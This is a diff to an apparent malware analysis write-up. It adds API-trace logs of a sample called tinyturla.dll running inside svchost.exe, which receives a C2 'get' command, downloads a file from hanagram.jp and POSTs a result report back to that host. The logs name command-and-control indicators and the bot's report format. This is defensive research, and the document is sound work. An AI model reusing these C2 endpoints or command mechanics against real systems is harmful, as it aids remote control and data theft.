@@ -215,9 +215,9 @@ Note thet thread executing the command **[tid 0x968]** is not the one sending th
 [STR]              "Microsoft Windows [version 6.3.9600]"
 [STR]              "(c) 2013 Microsoft Corporation. Tous droits r‚serv‚s."
 [STR]              ""
-[STR]              "C:\Windows\system32>chcp 437 > NUL"
+[STR]              "C:\Windows\system32>chcp 437 > NUL"    <--- US CodePage>
 [STR]              ""
-[STR]              "C:\Windows\system32>dir c:\users"
+[STR]              "C:\Windows\system32>dir c:\users"       <--- Command sent>
 [STR]              " Le volume dans le lecteur C n'a pas de nom."
 [STR]              " Le num‚ro de s‚rie du volume est 689B-5BB9"
 [STR]              ""
@@ -239,7 +239,121 @@ Note thet thread executing the command **[tid 0x968]** is not the one sending th
 
 ```
 
-As you can see, the malware is forcing the code page 437 (US) to be used even though my system is in french, hence the few misprints.  
+As you can see, the malware is forcing the code page 437 (suitable for English / German / Swedish) to be used even though my system is in french, hence the few misprints.  
 
 ---  
+
+Second command :  
+
+I've chosen to make the malware download and save a random file from the C2 (here a certificate) through the following order :  
+
+get https://hanagram.jp/hanagram.cert toto.cer  
+
+which triggered the following behavior :  
+
+```html
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803600
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A53F0
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66ad90
+[PAR] LPCWSTR   pwszVerb          : 0x000000F4405DF5E8
+[STR]           -> "GET"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F8A5090
+[STR]           -> "/hanagram.cert"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[...]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CreateFileA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName            : 0x000000F43F3BCD30
+[STR]         -> "toto.cer"
+[PAR] DWORD   dwDesiredAccess       : 0x40000000 (GENERIC_WRITE)
+[PAR] DWORD   dwCreationDisposition : 0x2 (CREATE_ALWAYS)
+[RET] 0x7fff146b6a18 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[EVT] [Kernel Monitoring]
+[MSG] [FILE_CREATED] [toto.cer]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WriteFile> in [KERNEL32.DLL] 
+[PAR] HANDLE hFile                 : 0x47c
+[PAR] LPVOID lpBuffer              : 0x000000F43F2D7AD0
+[PAR] DWORD  nNumberOfBytesToWrite : 0x505
+[RET] 0x7fff146b6a45 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <CloseHandle> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject    : 0x47c
+[RET] 0x7fff146b6abf in [tinyturla.dll]
+```
+
+Once the file download succesfuly, the malware reports back to the C2 :  
+
+```html
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e803410
+[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A5180
+[STR]               -> "hanagram.jp"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3f66b470
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F748
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F2C6F90
+[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F66A450
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F2C6F90
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xfa
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpWriteData> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
+[PAR] LPCVOID   lpBuffer                 : 0x000000F43F897BF0
+[STR]           -> "---"
+[STR]              "Content-Disposition: form-data;name="id""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "ea2ced84"
+[STR]              "---"
+[STR]              "Content-Disposition: form-data;name="result""
+[STR]              "Content-Type: text/plain"
+[STR]              ""
+[STR]              "[+] File https://hanagram.jp/hanagram.cert loaded and saved in toto.cer"
+[STR]              ""
+[STR]              "-----"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0xfa
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F7A0
+[RET] 0x7fff146bd3f2 in [tinyturla.dll]
+```
+
 
